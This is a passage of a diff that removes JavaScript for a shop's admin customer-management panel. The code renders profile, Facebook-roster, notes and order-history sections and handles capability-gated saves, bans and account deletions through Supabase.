-    if (o.kind !== wantKind || o.row_key === c.row_key || o.roster_deleted_at) return;
-    var m = _custMatchStrength(c.display_name, c.facebook_name, o.display_name, o.facebook_name);
-    if (m) out.push({ row: o, rank: m.rank, key: m.key });
-  });
-  out.sort(function (a, b) {
-    if (a.rank !== b.rank) return a.rank - b.rank;
-    return String(a.row.display_name || '').localeCompare(String(b.row.display_name || ''));
-  });
-  return out.slice(0, 6);
-}
-
-// One candidate, rendered the same whichever side it was found from.
-function _custCandidateRow(c, cand, canManage) {
-  var o = cand.row;
-  var memberId  = c.profile_id ? o.member_id  : c.member_id;
-  var profileId = c.profile_id ? c.profile_id : o.profile_id;
-  var meta = [];
-  if (o.primary_email)    meta.push(escapeHtml(o.primary_email));
-  if (o.facebook_name)    meta.push('fb: ' + escapeHtml(_custProperName(o.facebook_name)));
-  if (o.order_count)      meta.push(escapeHtml(String(o.order_count) + ' ' + t('admin_customers_orders_live').toLowerCase()));
-  if (o.membership_label) meta.push(escapeHtml(o.membership_label));
-  return '<div class="customer-candidate">'
-    + '<div style="min-width:0">'
-    +   '<div style="font-size:13px;color:var(--cream)">' + escapeHtml(_custProperName(o.display_name) || '') + '</div>'
-    +   (meta.length ? '<div style="font-size:11px;color:var(--cream-dim);word-break:break-word">' + meta.join(' &middot; ') + '</div>' : '')
-    +   '<div class="customer-candidate-conf">' + escapeHtml(t(cand.key)) + '</div>'
-    + '</div>'
-    + (canManage
-        ? '<button class="btn btn-outline btn-sm" onclick="customersLinkAccount(\'' + escapeHtml(memberId || '') + '\',\'' + escapeHtml(profileId || '') + '\')" data-t="admin_customers_link_btn"></button>'
-        : '')
-    + '</div>';
-}
-
-// The panel shown on a half-linked person, on whichever side is empty.
-function _custSuggestPanel(c, canManage) {
-  if (c.roster_deleted_at) {
-    return '<p style="color:var(--cream-dim);font-size:13px;font-style:italic" data-t="admin_customers_restore_before_link"></p>';
-  }
-  var sugg = customerSuggestions(c, _customersState._cache || []);
-  var searchFn = c.profile_id ? 'customersSearchRoster' : 'customersSearchAccounts';
-  var ph = c.profile_id ? 'admin_customers_link_roster_search_ph' : 'admin_customers_link_search_ph';
-  return '<div style="margin-top:12px">'
-    + (sugg.length
-        ? '<div class="customer-section-sub" data-t="admin_customers_suggested"></div>'
-          + sugg.map(function (s) { return _custCandidateRow(c, s, canManage); }).join('')
-        : '<p style="color:var(--cream-dim);font-size:12px;font-style:italic;margin:0 0 10px" data-t="admin_customers_no_suggestions"></p>')
-    + (canManage
-        ? '<div style="margin-top:10px">'
-          + '<input type="text" id="cuLinkSearch" oninput="' + searchFn + '(this.value)" placeholder="' + escapeHtml(t(ph)) + '" style="' + _CUST_INPUT + ';max-width:340px">'
-          + '<div id="cuLinkResults" style="margin-top:8px"></div>'
-          + '</div>'
-        : '')
-    + '<p class="customer-safe-note" data-t="admin_customers_link_safe"></p>'
-    + '</div>';
-}
-
-// Free-text search over the halves still unclaimed. Filters rows already
-// loaded, so it cannot fail and costs nothing per keystroke.
-function _custRenderSearch(c, wantKind, q) {
-  var el = document.getElementById('cuLinkResults');
-  if (!el) return;
-  var term = _custMatchKey(q);
-  if (term.length < 2) { el.innerHTML = ''; return; }
-  var rows = (_customersState._cache || []).filter(function (o) {
-    if (o.kind !== wantKind || o.row_key === c.row_key || o.roster_deleted_at) return false;
-    return _custMatchKey([o.display_name, o.primary_email, o.facebook_name].filter(Boolean).join(' ')).indexOf(term) !== -1;
-  }).slice(0, 8);
-  var canManage = hasCapability('can_manage_members');
-  el.innerHTML = rows.length
-    ? rows.map(function (o) { return _custCandidateRow(c, { row: o, key: 'admin_customers_conf_manual' }, canManage); }).join('')
-    : '<div style="font-size:12px;color:var(--cream-dim);font-style:italic">' + escapeHtml(t('admin_customers_link_none')) + '</div>';
-  if (typeof applyT === 'function') applyT();
-}
-
-function customersSearchRoster(q)   { var c = _custCurrentRow(); if (c) _custRenderSearch(c, 'roster', q); }
-function customersSearchAccounts(q) { var c = _custCurrentRow(); if (c) _custRenderSearch(c, 'account', q); }
-
-// §1 identity, contact and address. One save for all of it, because it is
-// one record and the old modal already treated it that way.
-function _custSectionIdentity(c, p, canManage) {
-  if (!p) {
-    return `<div class="customer-section">
-      <h4 class="customer-section-title" data-t="admin_customers_sec_identity"></h4>
-      <p style="color:var(--cream-dim);font-size:13px;font-style:italic" data-t="admin_customers_identity_roster_only"></p>
-    </div>`;
-  }
-  const ro = canManage ? '' : ' disabled';
-  return `<div class="customer-section">
-    <h4 class="customer-section-title" data-t="admin_customers_sec_identity"></h4>
-    <div class="customer-grid">
-      ${_custField('cuFirst', 'ea_first', p.first_name, ro)}
-      ${_custField('cuLast', 'ea_last', p.last_name, ro)}
-      ${_custField('cuFacebook', 'ea_facebook', p.facebook_name, ro)}
-      ${_custField('cuPaypal', 'ea_paypal', p.paypal_email, ro)}
-      ${_custField('cuPhone', 'ea_phone', p.phone, ro)}
-      <div>
-        <label style="${_CUST_LABEL}" data-t="col_email"></label>
-        <input type="text" value="${escapeHtml(p.email || '')}" style="${_CUST_INPUT};opacity:0.6" disabled title="${escapeHtml(t('ea_email_locked'))}">
-      </div>
-    </div>
-    <h4 class="customer-section-title" style="margin-top:18px" data-t="admin_customers_sec_address"></h4>
-    <div class="customer-grid">
-      ${_custField('cuAddress', 'ea_address', p.address, ro)}
-      ${_custField('cuAddress2', 'ea_address2', p.address_line_2, ro)}
-      ${_custField('cuCity', 'ea_city', p.city, ro)}
-      ${_custField('cuState', 'ea_state', p.state_region, ro)}
-      ${_custField('cuPostal', 'ea_postal', p.postal_code, ro)}
-      ${_custField('cuCountry', 'ea_country', p.country, ro)}
-      ${_custField('cuCountryCode', 'ea_country_code', p.country_code, ro + ' maxlength="3"')}
-    </div>
-    <div id="cuIdentityError" class="alert alert-error" style="margin-top:10px"></div>
-    ${canManage ? `<div style="margin-top:12px"><button class="btn btn-gold btn-sm" id="cuIdentitySave" onclick="customersSaveIdentity('${escapeHtml(p.id)}')" data-t="admin_customers_save"></button></div>` : ''}
-  </div>`;
-}
-
-// §2 the website account: what it can do, and whether it is blocked.
-function _custSectionAccount(c, p, canManage) {
-  if (!p) {
-    // Roster-only person. Offer to attach them to an existing account rather
-    // than leaving the two lists to drift apart by email again.
-    return `<div class="customer-section">
-      <h4 class="customer-section-title" data-t="admin_customers_sec_account"></h4>
-      <p style="color:var(--cream-dim);font-size:13px;font-style:italic;margin:0 0 12px" data-t="admin_customers_no_account_hint"></p>
-      ${_custSuggestPanel(c, canManage)}
-    </div>`;
-  }
-  const flags = (c.flags ? String(c.flags).split(',') : []).filter(Boolean);
-  const flagHtml = flags.length
-    ? flags.map(f => `<div class="flag-note">${escapeHtml(t(f === 'similar_email' ? 'flag_email' : 'flag_address'))}</div>`).join('')
-    : `<span style="color:var(--cream-dim);font-size:13px">—</span>`;
-  const isAdmin = isAdminEmail(p.email);
-  const safeId = escapeHtml(p.id);
-
-  let banRow;
-  if (c.is_banned) {
-    banRow = `<div style="font-size:13px;color:#c66;margin-bottom:6px">${escapeHtml(t('status_banned'))}${c.ban_reason ? ' - ' + escapeHtml(c.ban_reason) : ''}</div>`
-      + (canManage && !isAdmin ? `<button class="btn btn-ghost btn-sm" style="color:var(--gold-ink);border-color:var(--gold-ink)" onclick="customersUnban('${safeId}')" data-t="btn_unban"></button>` : '');
-  } else {
-    banRow = canManage && !isAdmin
-      ? `<button class="btn btn-ghost btn-sm" style="color:#8b2a2a;border-color:rgba(139,42,42,0.5)" onclick="customersBan('${safeId}')" data-t="btn_ban"></button>`
-      : `<span style="color:var(--cream-dim);font-size:13px">—</span>`;
-  }
-
-  return `<div class="customer-section">
-    <h4 class="customer-section-title" data-t="admin_customers_sec_account"></h4>
-    <div class="customer-grid">
-      <div>
-        <label style="${_CUST_LABEL}" data-t="col_status"></label>
-        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
-          <span class="status-badge status-${escapeHtml(p.status || 'pending')}">${escapeHtml(t('status_' + (p.status || 'pending')))}</span>
-          ${canManage && p.status !== 'approved' ? `<button class="btn btn-success btn-sm" onclick="customersSetStatus('${safeId}','approved')" data-t="btn_approve"></button>` : ''}
-          ${canManage && p.status !== 'denied' ? `<button class="btn btn-danger btn-sm" onclick="customersSetStatus('${safeId}','denied')" data-t="btn_deny"></button>` : ''}
-        </div>
-      </div>
-      <div>
-        <label style="${_CUST_LABEL}" data-t="access_label"></label>
-        ${canManage
-          ? `<select onchange="customersSetUnlimited('${safeId}', this.value === 'unlimited')" style="${_CUST_INPUT}">
-              <option value="standard" ${p.unlimited_access ? '' : 'selected'}>${escapeHtml(t('access_standard'))}</option>
-              <option value="unlimited" ${p.unlimited_access ? 'selected' : ''}>${escapeHtml(t('access_unlimited'))}</option>
-            </select>`
-          : `<div style="font-size:13px;color:var(--cream)">${escapeHtml(t(p.unlimited_access ? 'access_unlimited' : 'access_standard'))}</div>`}
-      </div>
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_customers_col_joined_site"></label>
-        <div style="font-size:13px;color:var(--cream)">${escapeHtml(_custFmtDate(p.created_at)) || '—'}</div>
-      </div>
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_customers_ban_label"></label>
-        ${banRow}
-      </div>
-      <div>
-        <label style="${_CUST_LABEL}" data-t="col_flags"></label>
-        ${flagHtml}
-      </div>
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_customers_account_id"></label>
-        <div style="font-family:'DM Mono',monospace;font-size:11px;color:var(--cream-dim);word-break:break-all">${escapeHtml(p.id)}</div>
-      </div>
-    </div>
-    ${c.member_id && canManage ? `<div style="margin-top:12px"><button class="btn btn-ghost btn-sm" onclick="customersUnlink('${escapeHtml(c.member_id)}')" data-t="admin_customers_unlink"></button></div>` : ''}
-  </div>`;
-}
-
-// §3 the Facebook roster entry.
-function _custSectionRoster(c, m, canManage) {
-  if (!m) {
-    return `<div class="customer-section">
-      <h4 class="customer-section-title" data-t="admin_customers_sec_roster"></h4>
-      <p style="color:var(--cream-dim);font-size:13px;font-style:italic;margin:0 0 12px" data-t="admin_customers_not_on_roster_hint"></p>
-      ${_custSuggestPanel(c, canManage)}
-      ${canManage && c.profile_id ? `<div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--line2)">
-        <button class="btn btn-ghost btn-sm" onclick="customersAddRosterForProfile('${escapeHtml(c.profile_id)}')" data-t="admin_customers_add_roster_for"></button>
-      </div>` : ''}
-    </div>`;
-  }
-  const ro = canManage ? '' : ' disabled';
-  const adv = _customersState.showAdvanced;
-  const isLinked = !!c.profile_id;
-  const sel = (id, cur, values, keyPrefix) => `<select id="${id}" style="${_CUST_INPUT}"${ro}>`
-    + values.map(v => `<option value="${escapeHtml(v)}"${cur === v ? ' selected' : ''}>${escapeHtml(t(keyPrefix + v.toLowerCase()))}</option>`).join('')
-    + '</select>';
-
-  return `<div class="customer-section">
-    <h4 class="customer-section-title" data-t="admin_customers_sec_roster"></h4>
-    <div class="customer-grid">
-      ${_custField('cuRosterName', 'admin_members_col_name', m.name, ro)}
-      ${_custField('cuRosterEmail', 'admin_customers_roster_email', m.email, ro)}
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_members_col_status"></label>
-        ${sel('cuRosterStatus', m.membership_status || 'Active', CUSTOMER_ROSTER_STATUSES, 'admin_members_status_')}
-      </div>
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_members_col_fb"></label>
-        ${sel('cuRosterFb', m.fb_group_member || 'No', CUSTOMER_FB_STATES, 'admin_members_fb_')}
-      </div>
-      ${_custField('cuRosterMembershipLabel', 'admin_customers_col_member_since', m.membership_label, ro)}
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_members_col_last_order"></label>
-        <input type="text" id="cuRosterLastOrderLabel" value="${escapeHtml(m.last_order_label || '')}" style="${_CUST_INPUT}"${ro}>
-        ${isLinked ? `<div style="font-size:10px;color:var(--cream-dim);margin-top:4px;font-style:italic">${escapeHtml(t('admin_customers_last_order_from_orders'))}</div>` : ''}
-      </div>
-    </div>
-    <div style="margin-top:12px;display:flex;gap:16px;flex-wrap:wrap;align-items:flex-start">
-      <label style="display:flex;align-items:center;gap:6px;font-size:13px;color:var(--cream);cursor:pointer">
-        <input type="checkbox" id="cuRosterValidated" ${m.validated ? 'checked' : ''}${ro}>
-        <span data-t="admin_members_col_validated"></span>
-      </label>
-      <div style="flex:1;min-width:220px">
-        <input type="text" id="cuRosterValidationReason" value="${escapeHtml(m.validation_reason || '')}" placeholder="${escapeHtml(t('admin_members_validation_reason_placeholder'))}" style="${_CUST_INPUT}"${ro}>
-      </div>
-    </div>
-    <div style="margin-top:10px">
-      <button class="btn btn-ghost btn-sm" onclick="customersToggleAdvanced()">${escapeHtml(t(adv ? 'admin_members_advanced_hide' : 'admin_members_advanced_show'))}</button>
-    </div>
-    ${adv ? `
-    <div class="customer-grid" style="margin-top:10px">
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_members_internal_sort_date"></label>
-        <input type="date" id="cuRosterMembershipDate" value="${escapeHtml(m.membership_date || '')}" style="${_CUST_INPUT}"${ro}>
-      </div>
-      <div>
-        <label style="${_CUST_LABEL}" data-t="admin_members_col_last_order"></label>
-        <input type="date" id="cuRosterLastOrderManual" value="${escapeHtml(isLinked ? '' : (m.last_order_date_manual || ''))}" style="${_CUST_INPUT}"${isLinked ? ' disabled title="' + escapeHtml(t('admin_customers_last_order_from_orders')) + '"' : ro}>
-      </div>
-    </div>
-    <p style="font-size:11px;color:var(--cream-dim);margin:6px 0 0" data-t="admin_members_advanced_help"></p>` : ''}
-    <div id="cuRosterError" class="alert alert-error" style="margin-top:10px"></div>
-    ${canManage ? `<div style="margin-top:12px"><button class="btn btn-gold btn-sm" onclick="customersSaveRoster('${escapeHtml(m.id)}')" data-t="admin_customers_save"></button></div>` : ''}
-  </div>`;
-}
-
-// §4 free-text notes. They live on the roster row, which is why a person
-// with no roster entry is offered one rather than a dead textarea.
-function _custSectionNotes(c, m, canManage) {
-  if (!m) {
-    return `<div class="customer-section">
-      <h4 class="customer-section-title" data-t="admin_customers_sec_notes"></h4>
-      <p style="color:var(--cream-dim);font-size:13px;font-style:italic" data-t="admin_customers_notes_need_roster"></p>
-    </div>`;
-  }
-  return `<div class="customer-section">
-    <h4 class="customer-section-title" data-t="admin_customers_sec_notes"></h4>
-    <textarea id="cuComments" rows="4" placeholder="${escapeHtml(t('admin_members_comments_placeholder'))}" style="${_CUST_INPUT};resize:vertical;font-family:inherit"${canManage ? '' : ' disabled'}>${escapeHtml(m.comments || '')}</textarea>
-    ${canManage ? `<div style="margin-top:10px"><button class="btn btn-gold btn-sm" onclick="customersSaveComments('${escapeHtml(m.id)}')" data-t="admin_customers_save"></button></div>` : ''}
-  </div>`;
-}
-
-// §5 who touched this record, and the two destructive actions, kept apart
-// from everything else so neither is a stray click away from a save button.
-function _custSectionProvenance(c, canManage) {
-  const line = (labelKey, value) => value
-    ? `<div style="font-size:12px;color:var(--cream-dim);margin-bottom:4px">${escapeHtml(t(labelKey))}: <span style="color:var(--cream)">${escapeHtml(value)}</span></div>`
-    : '';
-  const audit = [
-    line('admin_customers_created_by', c.created_by_email),
-    c.validated && c.validated_by_email ? line('admin_members_validated_by', c.validated_by_email + (c.validated_at ? ' (' + _custFmtDate(c.validated_at) + ')' : '')) : '',
-    c.roster_deleted_at ? line('admin_customers_deleted_by', (c.roster_deleted_by_email || '') + ' (' + _custFmtDate(c.roster_deleted_at) + ')') : '',
-  ].filter(Boolean).join('');
-
-  const danger = [];
-  if (canManage && c.member_id) {
-    danger.push(c.roster_deleted_at
-      ? `<button class="btn btn-outline btn-sm" onclick="customersRestoreRoster('${escapeHtml(c.member_id)}')" data-t="admin_members_restore"></button>`
-      : `<button class="btn btn-ghost btn-sm" style="color:#8b2a2a;border-color:rgba(139,42,42,0.5)" onclick="customersDeleteRoster('${escapeHtml(c.member_id)}')" data-t="admin_customers_delete_roster"></button>`);
-  }
-  if (canManage && c.profile_id && !isAdminEmail(c.primary_email || '')) {
-    danger.push(`<button class="btn btn-danger btn-sm" onclick="customersDeleteAccount('${escapeHtml(c.profile_id)}')" data-t="admin_customers_delete_account"></button>`);
-  }
-
-  return `<div class="customer-section">
-    <h4 class="customer-section-title" data-t="admin_customers_sec_provenance"></h4>
-    ${audit || `<div style="font-size:12px;color:var(--cream-dim)">—</div>`}
-    ${danger.length ? `<div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--line2)">
-      <div style="font-size:11px;color:var(--cream-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px" data-t="admin_customers_danger"></div>
-      <div class="action-group">${danger.join('')}</div>
-      <p style="font-size:11px;color:var(--cream-dim);margin:8px 0 0;font-style:italic" data-t="admin_customers_danger_hint"></p>
-    </div>` : ''}
-  </div>`;
-}
-
-// ── order history ─────────────────────────────────────────────────────
-// Read-only. Every mutation an order needs already lives in the Orders tab,
-// and eight call sites there re-render that table unconditionally; driving
-// them from here would repaint a hidden tab and leave this one stale.
-// The jump button hands the admin to the real editor instead.
-
-async function renderCustomerOrders(profileId, renderKey) {
-  const el = document.getElementById('customerOrders');
-  if (!el) return;
-  if (!profileId) {
-    el.innerHTML = `<p style="color:var(--cream-dim);font-size:13px;font-style:italic">${escapeHtml(t('admin_customers_orders_no_account'))}</p>`;
-    return;
-  }
-  const { data: orders, error } = await sb
-    .from('orders')
-    .select('*, ' + ORDER_ITEMS_PROJECTION)
-    .eq('user_id', profileId)
-    .order('created_at', { ascending: false });
-
-  // This runs un-awaited from renderCustomerProfile, so by the time it returns
-  // the admin may have gone back to the list or opened someone else.
-  if (renderKey !== undefined && _customersState.openKey !== renderKey) return;
-  if (error) {
-    // A query error is not an empty history. Say so, the same way the Orders
-    // tab does, so a temporary failure can never read as "this customer has
-    // never ordered".
-    el.innerHTML = `<div style="padding:12px 14px;border:1px solid #b00;border-radius:6px;background:rgba(176,0,0,0.06);color:#b00;font-size:13px;line-height:1.5">
-      <strong>${escapeHtml(t('admin_customers_orders_load_failed'))}</strong><br>${escapeHtml(error.message || String(error))}</div>`;
-    return;
-  }
-  if (!orders || !orders.length) {
-    el.innerHTML = `<p style="color:var(--cream-dim);font-size:13px;font-style:italic">${escapeHtml(t('admin_customers_orders_none'))}</p>`;
-    return;
-  }
-
-  let liveCount = 0, liveUnits = 0, liveValue = 0;
-  const rows = orders.map(o => {
-    const status = o.status || 'pending';
-    const isCancelled = !!o.cancelled_at || status === 'cancelled';
-    let units = 0;
-    for (const it of (o.order_items || [])) {
-      const r = resolveOrderItem(it);
-      if (r.is_gift) continue;
-      units += (r.is_set ? (r.set_member_count || 1) : 1) * (it.quantity || 1);
-    }
-    const total = computeOrderFinalTotal(o);
-    if (!isCancelled) { liveCount++; liveUnits += units; liveValue += Number(total) || 0; }
-
-    const itemNames = (o.order_items || []).map(it => {
-      const r = resolveOrderItem(it);
-      const nm = splitByLang(r.name, lang);
-      const col = splitByLang(r.color, lang);
-      return escapeHtml([r.style, nm, col].filter(Boolean).join(' · ')) + (r.is_gift ? ' <span style="color:#4a8a5e;font-style:italic">' + escapeHtml(t('admin_customers_gift_short')) + '</span>' : '');
-    }).join('<br>');
-
-    return `<tr${isCancelled ? ' class="customer-order-cancelled"' : ''}>
-      <td style="white-space:nowrap"><span style="font-family:'DM Mono',monospace;font-size:12px;color:var(--gold-ink)">${escapeHtml(o.order_id || '')}</span>${o.season ? `<br><span style="font-size:10px;color:var(--cream-dim)">${escapeHtml(String(o.season))}</span>` : ''}</td>
-      <td style="white-space:nowrap;font-size:12px;color:var(--cream-dim)">${escapeHtml(_custFmtDate(o.created_at))}</td>
-      <td><span class="status-badge status-${escapeHtml(isCancelled ? 'cancelled' : status)}">${escapeHtml(t('status_' + (isCancelled ? 'cancelled' : status)))}</span></td>
-      <td style="font-size:12px;line-height:1.5">${itemNames || '<span style="color:var(--cream-dim)">—</span>'}</td>
-      <td style="text-align:right;white-space:nowrap">${units}</td>
-      <td style="text-align:right;white-space:nowrap;font-family:'DM Mono',monospace;color:var(--gold-ink)">${(Number(total) || 0) > 0 ? '€' + (Number(total) || 0).toFixed(2) : '—'}</td>
-      <td style="white-space:nowrap"><div class="action-group">
-        <button class="btn btn-outline btn-sm" onclick="customersJumpToOrder('${escapeHtml(o.id)}','${escapeHtml(o.order_id || '')}')" data-t="admin_customers_order_open"></button>
-        <button class="btn btn-ghost btn-sm" onclick="downloadOrderPdf('${escapeHtml(o.id)}','confirmation')" data-t="pdf_confirm_btn"></button>
-      </div></td>
-    </tr>`;
-  }).join('');
-
-  el.innerHTML = `
-    <div style="display:flex;gap:18px;flex-wrap:wrap;margin-bottom:12px;font-size:12px;color:var(--cream-dim)">
-      <span>${escapeHtml(t('admin_customers_orders_live'))}: <strong style="color:var(--cream)">${liveCount}</strong></span>
-      <span>${escapeHtml(t('admin_customers_orders_units'))}: <strong style="color:var(--cream)">${liveUnits}</strong></span>
-      <span>${escapeHtml(t('admin_customers_orders_value'))}: <strong style="color:var(--gold-ink);font-family:'DM Mono',monospace">€${liveValue.toFixed(2)}</strong></span>
-      ${orders.length !== liveCount ? `<span style="font-style:italic">${escapeHtml(t('admin_customers_orders_cancelled_excluded'))}</span>` : ''}
-    </div>
-    <div class="admin-table-wrap"><table class="admin-table customer-orders-table"><thead><tr>
-      <th>${escapeHtml(t('admin_customers_col_order'))}</th>
-      <th>${escapeHtml(t('admin_customers_col_date'))}</th>
-      <th>${escapeHtml(t('col_status'))}</th>
-      <th>${escapeHtml(t('admin_customers_col_items'))}</th>
-      <th style="text-align:right">${escapeHtml(t('col_qty'))}</th>
-      <th style="text-align:right">${escapeHtml(t('col_total'))}</th>
-      <th>${escapeHtml(t('col_actions'))}</th>
-    </tr></thead><tbody>${rows}</tbody></table></div>`;
-  if (typeof applyT === 'function') applyT();
-}
-
-// Hand the admin to the Orders tab with this order found and open. The
-// Orders table renders asynchronously, so the search and expand have to wait
-// for it rather than firing into an empty DOM.
-async function customersJumpToOrder(orderDbId, orderId) {
-  adminTab('orders');
-  if (typeof renderAdminOrders === 'function') await renderAdminOrders();
-  // The Orders tab collapses the cancelled group by default, and a collapsed
-  // group's rows stay display:none however the search matches. Open the group
-  // this order lives in first, or the admin lands on an apparently empty table
-  // with the order number already typed into the search box.
-  const targetRow = document.querySelector(`[data-expand-target="expand-${orderDbId}"]`);
-  if (targetRow && typeof adminOrderGroupCollapsed !== 'undefined') {
-    const grp = targetRow.getAttribute('data-group');
-    if (grp && adminOrderGroupCollapsed[grp]) {
-      adminOrderGroupCollapsed[grp] = false;
-      if (typeof renderAdminOrders === 'function') await renderAdminOrders();
-    }
-  }
-  if (orderId && typeof filterAdminOrders === 'function') {
-    const box = document.getElementById('adminOrderSearch');
-    if (box) box.value = orderId;
-    filterAdminOrders(orderId);
-  }
-  if (typeof reopenAdminOrderRow === 'function') reopenAdminOrderRow(orderDbId);
-  const row = document.querySelector(`[data-expand-target="expand-${orderDbId}"]`);
-  if (row && row.scrollIntoView) row.scrollIntoView({ block: 'center' });
-}
-
-// ── mutations ─────────────────────────────────────────────────────────
-// Every one of these is gated. Three of the equivalents on the old tabs were
-// not: the live CSV import lost its check when the function was reassigned,
-// mass delete never had one, and single-account delete had none client-side.
-
-function _custShowError(id, msg) {
-  const el = document.getElementById(id);
-  if (!el) { alert(msg); return; }
-  el.textContent = msg;
-  el.classList.add('show');
-}
-
-async function customersSaveIdentity(profileId) {
-  if (!requireCapability('can_manage_members')) return;
-  const val = (id) => { const el = document.getElementById(id); return el ? el.value.trim() : ''; };
-  const nn = (x) => (x === '' ? null : x);
-  const updates = {
-    first_name: nn(val('cuFirst')), last_name: nn(val('cuLast')),
-    facebook_name: nn(val('cuFacebook')), paypal_email: nn(val('cuPaypal')),
-    phone: nn(val('cuPhone')), address: nn(val('cuAddress')),
-    address_line_2: nn(val('cuAddress2')), city: nn(val('cuCity')),
-    state_region: nn(val('cuState')), postal_code: nn(val('cuPostal')),
-    country: nn(val('cuCountry')), country_code: nn(val('cuCountryCode')),
-  };
-  const btn = document.getElementById('cuIdentitySave');
-  if (btn) btn.disabled = true;
-  const { error } = await sb.from('profiles').update(updates).eq('id', profileId);
-  if (btn) btn.disabled = false;
-  if (error) { _custShowError('cuIdentityError', t('ea_save_failed') + (error.message || '')); return; }
-  _customersState._profile = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-async function customersSetStatus(profileId, status) {
-  if (!requireCapability('can_manage_members')) return;
-  const { error } = await sb.from('profiles').update({ status }).eq('id', profileId);
-  if (error) { alert(t('ea_save_failed') + (error.message || '')); return; }
-  if (status === 'approved' || status === 'denied') sendEmailNotification('account_' + status, { userId: profileId });
-  _customersState._profile = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-async function customersSetUnlimited(profileId, val) {
-  if (!requireCapability('can_manage_members')) return;
-  const { error } = await sb.from('profiles').update({ unlimited_access: !!val }).eq('id', profileId);
-  if (error) { alert('Could not update: ' + (error.message || '')); return; }
-  _customersState._profile = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-// Ban and delete reuse the existing modals rather than growing second copies
-// of two flows that already carry typed confirmations and audit trails.
-// The id comes from the button, the name and email come from the open row.
-// If those two ever disagree the modal would show one person's name over
-// another person's id, so refuse rather than confirm the wrong deletion.
-function _custRowFor(profileId) {
-  const c = _custCurrentRow();
-  if (!c || String(c.profile_id) !== String(profileId)) return null;
-  return c;
-}
-
-function customersBan(profileId) {
-  if (!requireCapability('can_manage_members')) return;
-  const c = _custRowFor(profileId);
-  if (!c) return;
-  openBanAccountModal(profileId, c.primary_email || '', c.display_name || '');
-}
-
-// The accounts tab had two unban paths: a bare confirm() with no reason and
-// no audit, and the History tab's modal which requires a reason and goes
-// through the Edge Function. This uses the audited one.
-function customersUnban(profileId) {
-  if (!requireCapability('can_manage_members')) return;
-  const c = _custRowFor(profileId);
-  if (!c) return;
-  if (typeof openUnbanModal === 'function') openUnbanModal(c.primary_email || '');
-  else if (typeof adminUnbanEmail === 'function') adminUnbanEmail(c.primary_email || '');
-}
-
-function customersDeleteAccount(profileId) {
-  if (!requireCapability('can_manage_members')) return;
-  const c = _custRowFor(profileId);
-  if (!c) return;
-  openDeleteAccountModal(profileId, c.primary_email || '', c.display_name || '');
-}
-
-function _custCurrentRow() {
-  const rows = _customersState._cache || [];
-  return rows.find(r => r.row_key === _customersState.openKey) || null;
-}
-
-function customersToggleAdvanced() {
-  _customersState.showAdvanced = !_customersState.showAdvanced;
-  _customersState._useCache = true;
-  renderAdminCustomers();
-}
-
-// Re-rendering an open profile rebuilds every input from the database row, so
-// anything typed and not yet saved would vanish without a word. The refresh
-// pill, the advanced-dates toggle, a language switch and any mutation all
-// trigger one. Carry the live values across the rebuild instead: the admin
-// keeps their edits, and the Save button still decides what reaches the
-// database.
-const _CUST_FORM_IDS = [
-  'cuFirst','cuLast','cuFacebook','cuPaypal','cuPhone','cuAddress','cuAddress2',
-  'cuCity','cuState','cuPostal','cuCountry','cuCountryCode',
-  'cuRosterName','cuRosterEmail','cuRosterStatus','cuRosterFb',
-  'cuRosterMembershipLabel','cuRosterLastOrderLabel','cuRosterValidationReason',
-  'cuRosterMembershipDate','cuRosterLastOrderManual','cuComments',
-];
-
-function _custCaptureForm() {
-  const snap = {};
-  _CUST_FORM_IDS.forEach(id => {
-    const el = document.getElementById(id);
-    if (el && !el.disabled) snap[id] = el.value;
-  });
-  const v = document.getElementById('cuRosterValidated');
-  if (v && !v.disabled) snap.cuRosterValidated = v.checked;
-  return snap;
-}
-
-function _custRestoreForm(snap) {
-  if (!snap) return;
-  Object.keys(snap).forEach(id => {
-    const el = document.getElementById(id);
-    if (!el || el.disabled) return;
-    if (id === 'cuRosterValidated') el.checked = snap[id];
-    else if (el.value !== snap[id]) el.value = snap[id];
-  });
-}
-
-async function customersSaveRoster(memberId) {
-  if (!requireCapability('can_manage_members')) return;
-  const val = (id) => { const el = document.getElementById(id); return el ? el.value.trim() : ''; };
-  const nn = (x) => (x === '' ? null : x);
-  const name = val('cuRosterName');
-  if (!name) { _custShowError('cuRosterError', t('admin_members_name_required')); return; }
-  const manualEl = document.getElementById('cuRosterLastOrderManual');
-  const payload = {
-    name,
-    email: nn(val('cuRosterEmail')),
-    membership_status: val('cuRosterStatus') || 'Active',
-    fb_group_member: val('cuRosterFb') || 'No',
-    membership_label: nn(val('cuRosterMembershipLabel')),
-    last_order_label: nn(val('cuRosterLastOrderLabel')),
-    validated: !!(document.getElementById('cuRosterValidated') || {}).checked,
-    validation_reason: nn(val('cuRosterValidationReason')),
-  };
-  // Only write a field the admin could actually see and change. For a linked
-  // person the manual last-order input is rendered disabled and blank, so
-  // reading it would write NULL over a date typed years ago in the Facebook
-  // era - silently, on a save the admin made for some unrelated reason, with
-  // no way to get it back. A disabled control is not consent to erase.
-  // Same rule as membership_date below: present and enabled, or not written.
-  if (manualEl && !manualEl.disabled) payload.last_order_date_manual = nn(manualEl.value);
-  const mdEl = document.getElementById('cuRosterMembershipDate');
-  if (mdEl && !mdEl.disabled) payload.membership_date = nn(mdEl.value);
-
-  const { error } = await sb.from('members').update(payload).eq('id', memberId);
-  if (error) { _custShowError('cuRosterError', t('admin_members_save_failed') + (error.message || '')); return; }
-  _customersState._member = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-async function customersSaveComments(memberId) {
-  if (!requireCapability('can_manage_members')) return;
-  const el = document.getElementById('cuComments');
-  const comments = el ? (el.value.trim() || null) : null;
-  const { error } = await sb.from('members').update({ comments }).eq('id', memberId);
-  if (error) { alert(t('admin_members_save_failed') + (error.message || '')); return; }
-  _customersState._member = null;
